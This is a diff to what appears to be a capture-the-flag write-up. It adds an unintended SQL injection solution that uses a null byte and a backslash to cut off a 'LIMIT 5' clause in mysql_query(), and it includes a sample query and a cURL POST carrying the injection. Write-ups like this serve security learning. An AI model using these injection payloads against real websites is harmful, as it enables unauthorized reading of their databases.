@@ -56,3 +56,18 @@ or 1=6e0union select 1,2,3 #\
 ```
 
 I hope you still had fun working on it.
+
+### Unintended solution 2
+It was actually possible to bypass the 'LIMIT 5' by ending the payload with a null byte followed by the backslash because mysql_query() would interpret it as EOF.
+
+```
+MySQL
+WHERE first_name='injection here and escape last quote like so \x00\'
+OR last_name='injection here and escape last quote like so \x00\'
+ORDER BY id ASC LIMIT 5
+```
+######Using cURL
+```
+curl -X POST --data "name= OR id=<injection>;%00\&site=default&action=search" <Website> 
+```
+Using this technique allowed the output of 160 ids at the time, making the challenge possible to solve in a single request the "intended" way.
